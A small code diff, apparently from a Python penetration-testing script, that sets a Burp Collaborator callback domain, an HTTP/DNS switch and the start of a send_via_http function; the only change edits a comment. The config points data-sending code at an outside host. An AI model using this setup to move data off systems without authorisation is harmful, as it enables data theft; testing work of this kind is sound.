@@ -3,7 +3,7 @@ import requests
 import socket
 
 # === Config ===
-BURP_COLLABORATOR_DOMAIN = "rc77j10gfhi8achyl51ogqepngtah05p.oastify.com"  # replace with yours
+BURP_COLLABORATOR_DOMAIN = "rc77j10gfhi8achyl51ogqepngtah05p.oastify.com"  # replace with your
 USE_HTTP = True  # Set to False to use DNS
 
 def send_via_http(data):
